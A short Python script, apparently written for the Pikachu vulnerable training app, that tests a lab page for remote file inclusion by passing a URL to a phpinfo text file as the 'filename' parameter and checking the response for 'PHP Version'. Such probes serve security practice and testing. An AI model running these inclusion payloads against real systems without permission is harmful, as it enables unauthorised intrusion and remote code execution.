import requests
from colorama import init, Fore

init(autoreset=True)


def scan_remote_file_inclusion(url, file_param, file_path):
    payload = {
        file_param: file_path,
        'submit':'提交'
    }

    try:
        response = requests.get(url, params=payload)

        if response.status_code == 200 and "PHP Version" in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException:
        return False



if __name__ == '__main__':
    target_urls = [
        'http://192.168.1.192:8086/pikachu/vul/fileinclude/fi_remote.php'
        # 添加更多目标URL
    ]

    file_param = "filename"
    file_path = "http://192.168.1.192:8086/pikachu/test/phpinfo.txt"

    for url in target_urls:
        print(scan_remote_file_inclusion(url, file_param, file_path))
